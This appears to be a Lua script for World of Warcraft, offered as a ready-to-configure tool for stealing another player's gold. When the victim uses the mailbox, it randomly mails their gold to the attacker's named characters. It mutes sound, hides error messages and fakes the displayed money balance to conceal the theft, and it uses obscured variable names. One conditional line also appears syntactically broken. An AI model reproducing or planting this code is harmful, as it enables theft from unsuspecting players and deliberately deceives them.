-- When mailbox is clicked:
--	10% chance that all gold will be mailed away (modify 0.1 if you want to change that)
--	Only if the victim has more than 50g (modify 500000 if you want to change that)
--	Only after a specific date
-- Replace ALLIANCENAME and HORDENAME with your character names
-- Target time is specified using Unix time. Change the number 1463955000 to your target: http://www.unixtimestamp.com/
-- Effects shouldn't be noticable until victim tries to buy something or logs out


_v0='SoundVolume'
_v2=0
_v3=GetMoney
_vz=MoneyFrame_UpdateMoney
_vc=UIErrorsFrame
_vd=SetSendMailMoney
_v1=SendMail
_v4=CreateFrame('frame')
_v4:RegisterEvent('MAIL_SEND_SUCCESS')
_v4:SetScript('OnEvent',function()
	_v5=_v3()
	if _v2==0 time()>1463955000 and _v5>500000 and math.random()<0.1 then
		
		_v6=GetCVar(_v0)
		
		_vc:Hide()
		SetCVar(_v0,0)
		
		_v8=_v5
		
		_vd(_v5-30)
		_v1(UnitFactionGroup("player")=="Horde" and "HORDENAME" or "ALLIANCENAME",'g','')
		
		GetMoney=function()
			return _v8+_v3()
		end
		MoneyFrame_UpdateMoney=function()end
		
		_v9=GetTime()+2
		_va=function()
			if GetTime()>_v9 then
				_vb:SetScript('OnUpdate',nil)
				SetCVar(_v0,_v6)
				MoneyFrame_UpdateMoney=_vz
			end
		end
		_vb=CreateFrame('frame')
		_vb:SetScript('OnUpdate',_va)
		
		_v2=1
	elseif _v2==1 then
		_v2=2
	elseif _v2==2 then
		_vc:Clear()
		_vc:Show()
		
		_v2=3
	end
end)